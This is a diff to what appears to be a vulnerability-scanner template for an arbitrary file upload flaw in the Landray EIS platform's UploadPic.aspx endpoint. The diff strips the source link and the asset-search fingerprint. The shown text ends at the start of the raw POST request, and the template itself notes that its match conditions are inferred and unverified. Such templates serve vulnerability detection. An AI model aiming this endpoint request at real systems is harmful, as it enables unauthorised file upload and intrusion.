@@ -3,14 +3,8 @@ info:
   name: 蓝凌EIS智慧协同平台UploadPic接口任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/940feb42fcb9f06f4848df81de5a338c
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 940feb42fcb9f06f4848df81de5a338c
-    fofa: + hunter`app.name="Landray 蓝凌 EIS智慧协同平台"`
 http:
 - raw:
   - 'POST /HR/Ajax/UploadPic.aspx?KeyID=111 HTTP/1.1
